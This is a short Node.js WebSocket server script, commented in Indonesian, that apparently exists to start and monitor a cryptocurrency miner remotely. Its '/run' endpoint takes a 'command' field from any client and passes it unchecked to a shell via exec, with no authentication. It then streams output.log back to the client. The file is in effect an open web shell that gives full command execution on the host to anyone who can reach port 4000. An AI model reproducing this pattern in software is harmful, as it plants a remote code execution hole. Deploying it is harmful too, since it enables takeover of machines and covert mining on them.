const http = require('http');
const WebSocket = require('ws');
const { exec } = require('child_process');
const fs = require('fs');

const server = http.createServer((req, res) => {
  res.writeHead(200);
  res.end('WebSocket server running.\n');
});

const wss = new WebSocket.Server({ server, path: '/run' });

console.log('Listening on port 4000');

wss.on('connection', ws => {
  console.log('New WS client connected');

  let logInterval;

  ws.on('message', msg => {
    let data;
    try {
      data = JSON.parse(msg);
      console.log('Got:', data);
    } catch (err) {
      ws.send('Invalid JSON');
      return;
    }

    if (data.command) {
      // Jalankan perintah mining
      exec(data.command);

      ws.send(`Command started: ${data.command}`);

      // Kirim isi output.log tiap 5 detik
      if (!logInterval) {
        let lastSize = 0;
        logInterval = setInterval(() => {
          fs.stat('output.log', (err, stats) => {
            if (err) return; // output.log belum ada

            if (stats.size > lastSize) {
              const stream = fs.createReadStream('output.log', {
                start: lastSize,
                end: stats.size
              });

              let chunk = '';
              stream.on('data', data => {
                chunk += data.toString();
              });

              stream.on('end', () => {
                ws.send(chunk);
                lastSize = stats.size;
              });
            }
          });
        }, 5000);
      }

    } else if (data.type === 'ping') {
      ws.send('pong');
    } else {
      ws.send('No command received');
    }
  });

  ws.on('close', () => {
    console.log('Client disconnected');
    if (logInterval) clearInterval(logInterval);
  });
});

server.listen(4000);
